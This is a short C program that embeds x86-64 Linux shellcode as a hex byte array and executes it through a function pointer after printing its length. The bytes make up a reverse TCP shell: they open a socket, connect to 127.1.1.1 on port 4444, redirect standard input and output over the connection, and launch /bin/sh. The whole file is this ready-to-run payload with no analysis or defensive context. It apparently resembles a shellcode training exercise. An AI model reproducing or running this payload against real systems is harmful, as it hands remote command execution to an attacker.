#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = \
"\xeb\x09\x48\x31\xf6\x48\xf7\xe6\x56\x5f\xc3\xe8"
"\xf2\xff\xff\xff\x48\x83\xc0\x29\x48\xff\xc6\x48"
"\xff\xc7\x48\xff\xc7\x0f\x05\x49\x89\xc0\xe8\xdb"
"\xff\xff\xff\x50\x68\x7f\x01\x01\x01\x66\x68\x11"
"\x5c\x48\xff\xc2\x48\xff\xc2\x66\x52\x48\x83\xc0"
"\x2a\x48\x89\xe6\x41\x50\x5f\x80\xc2\x0e\x0f\x05"
"\xe8\xb5\xff\xff\xff\x4c\x89\xc7\x48\x83\xc0\x21"
"\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\xff\xc6"
"\x0f\x05\x48\x31\xc0\x48\x83\xc0\x21\x48\xff\xc6"
"\x0f\x05\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e"
"\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2"
"\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
int main()
{
 printf("Shellcode Length:  %d\n", strlen(shellcode));
 int (*ret)() = (int(*)())shellcode;
 ret();
}
